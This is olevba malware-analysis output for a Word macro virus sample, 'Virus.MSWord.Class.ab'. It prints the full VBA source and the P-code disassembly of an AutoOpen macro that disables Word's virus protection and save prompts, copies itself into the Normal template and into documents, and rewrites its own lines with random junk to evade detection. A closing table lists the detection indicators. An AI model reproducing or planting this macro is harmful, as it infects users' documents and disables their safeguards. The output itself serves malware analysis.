olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Class.ab
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Class.ab - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
VUV = SJR + VFD
On Error Resume Next
PAH = PCC + GIM
RG48 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
GGR = GII + SJP
Options.ConfirmConversions = 0
OIU = OLE + MQK
Options.VirusProtection = 0
TGO = TGI + AGV
Options.SaveNormalPrompt = 0
QMN = FLR + SCL
Application.EnableCancelKey = 0
JBJ = PKI + UVN
PP86 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
LNB = EGA + DJM
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
MRA = IBG + NLN
Set CU64 = ActiveDocument.VBProject.VBComponents.Item(1)
HUQ = MJQ + DBF
LL21 = True
QUH = PRA + RKE
End If
NTU = OAO + VAU
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
BGM = RAB + MGJ
Set CU64 = NormalTemplate.VBProject.VBComponents.Item(1)
LQJ = HBI + MQM
PV81 = True
ORJ = RPP + QER
End If
BFU = SEE + FUF
If PV81 <> True And LL21 <> True Then GoTo NO90
FPO = RQG + SPT
If PV81 = True Then CU64.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, RG48 - 1))
EHM = HEM + NDB
If LL21 = True Then CU64.CodeModule.AddFromString ("Sub AutoOpen()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, PP86 - 1))
NSO = JEK + VQI
With CU64.CodeModule
KMO = AOT + HCJ
For x = 2 To (CU64.CodeModule.CountOfLines - 1) Step 2
QHJ = QJP + LDG
.replaceline x, (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " = " & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " + " & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22)))
BVG = NGS + HRD
Next x
GBK = JNA + HCH
End With
QNV = SMN + ETH
NO90:
NNQ = PPQ + FML
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Class.ab
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 3927 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	Ld SJR 
' 	Ld VFD 
' 	Add 
' 	St VUV 
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	Ld PCC 
' 	Ld GIM 
' 	Add 
' 	St PAH 
' Line #4:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St RG48 
' Line #5:
' 	Ld GII 
' 	Ld SJP 
' 	Add 
' 	St GGR 
' Line #6:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #7:
' 	Ld OLE 
' 	Ld MQK 
' 	Add 
' 	St OIU 
' Line #8:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #9:
' 	Ld TGI 
' 	Ld AGV 
' 	Add 
' 	St TGO 
' Line #10:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #11:
' 	Ld FLR 
' 	Ld SCL 
' 	Add 
' 	St QMN 
' Line #12:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #13:
' 	Ld PKI 
' 	Ld UVN 
' 	Add 
' 	St JBJ 
' Line #14:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St PP86 
' Line #15:
' 	Ld EGA 
' 	Ld DJM 
' 	Add 
' 	St LNB 
' Line #16:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Sub"
' 	Ne 
' 	IfBlock 
' Line #17:
' 	Ld IBG 
' 	Ld NLN 
' 	Add 
' 	St MRA 
' Line #18:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set CU64 
' Line #19:
' 	Ld MJQ 
' 	Ld DBF 
' 	Add 
' 	St HUQ 
' Line #20:
' 	LitVarSpecial (True)
' 	St LL21 
' Line #21:
' 	Ld PRA 
' 	Ld RKE 
' 	Add 
' 	St QUH 
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	Ld OAO 
' 	Ld VAU 
' 	Add 
' 	St NTU 
' Line #24:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Sub"
' 	Ne 
' 	IfBlock 
' Line #25:
' 	Ld RAB 
' 	Ld MGJ 
' 	Add 
' 	St BGM 
' Line #26:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set CU64 
' Line #27:
' 	Ld HBI 
' 	Ld MQM 
' 	Add 
' 	St LQJ 
' Line #28:
' 	LitVarSpecial (True)
' 	St PV81 
' Line #29:
' 	Ld RPP 
' 	Ld QER 
' 	Add 
' 	St ORJ 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	Ld SEE 
' 	Ld FUF 
' 	Add 
' 	St BFU 
' Line #32:
' 	Ld PV81 
' 	LitVarSpecial (True)
' 	Ne 
' 	Ld LL21 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo NO90 
' 	EndIf 
' Line #33:
' 	Ld RQG 
' 	Ld SPT 
' 	Add 
' 	St FPO 
' Line #34:
' 	Ld PV81 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000F "Sub AutoClose()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld RG48 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	Ld CU64 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #35:
' 	Ld HEM 
' 	Ld NDB 
' 	Add 
' 	St EHM 
' Line #36:
' 	Ld LL21 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000E "Sub AutoOpen()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld PP86 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	Ld CU64 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #37:
' 	Ld JEK 
' 	Ld VQI 
' 	Add 
' 	St NSO 
' Line #38:
' 	StartWithExpr 
' 	Ld CU64 
' 	MemLd CodeModule 
' 	With 
' Line #39:
' 	Ld AOT 
' 	Ld HCJ 
' 	Add 
' 	St KMO 
' Line #40:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld CU64 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #41:
' 	Ld QJP 
' 	Ld LDG 
' 	Add 
' 	St QHJ 
' Line #42:
' 	Ld x 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitStr 0x0003 " + "
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #43:
' 	Ld NGS 
' 	Ld HRD 
' 	Add 
' 	St BVG 
' Line #44:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #45:
' 	Ld JNA 
' 	Ld HCH 
' 	Add 
' 	St GBK 
' Line #46:
' 	EndWith 
' Line #47:
' 	Ld SMN 
' 	Ld ETH 
' 	Add 
' 	St QNV 
' Line #48:
' 	Label NO90 
' Line #49:
' 	Ld PPQ 
' 	Ld FML 
' 	Add 
' 	St NNQ 
' Line #50:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

